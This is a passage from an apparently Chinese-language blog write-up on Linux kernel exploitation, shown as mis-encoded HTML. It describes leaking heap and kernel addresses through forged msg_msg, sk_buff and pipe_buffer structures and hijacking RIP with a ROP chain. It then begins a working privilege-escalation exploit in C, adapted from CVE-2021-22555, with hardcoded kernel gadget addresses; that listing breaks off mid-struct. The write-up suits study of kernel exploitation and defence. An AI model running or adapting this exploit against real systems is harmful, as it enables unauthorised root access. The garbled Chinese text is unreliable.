ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ</strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"><a href="#Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="Step.IV å †å–· pipe_bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"></a>Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ"><a href="#Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ" class="headerlink" title="Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ"></a>Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼ˆåŸºæœ¬ä¸Šå°±æ˜¯æŠŠ CVE-2021-22555 çš„ exp é‡Œ trigger oob çš„å‡½æ•°æ”¹ä¸€ä¸‹å°±èƒ½æ‰“é€šäº†ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/watch_queue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    